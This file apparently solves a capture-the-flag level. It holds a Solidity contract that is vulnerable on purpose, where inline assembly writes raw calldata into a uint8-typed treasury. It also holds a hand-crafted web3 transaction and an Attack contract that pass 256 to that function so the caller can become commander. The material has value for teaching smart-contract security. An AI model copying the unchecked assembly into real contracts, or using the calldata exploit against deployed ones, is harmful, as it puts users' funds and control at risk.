// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}

// await web3.eth.sendTransaction({
//     from: user,
//     to: contractAddress,
//     data: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000100"
// });


contract Attack {
    constructor(address _address) public {
        // 1. Собираем calldata вручную
        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("registerTreasury(uint8)")),
            uint256(256)
        );

        // 2. Отправляем через низкоуровневый call
        (bool success, ) = _address.call(data);
        require(success, "call failed");
    }
}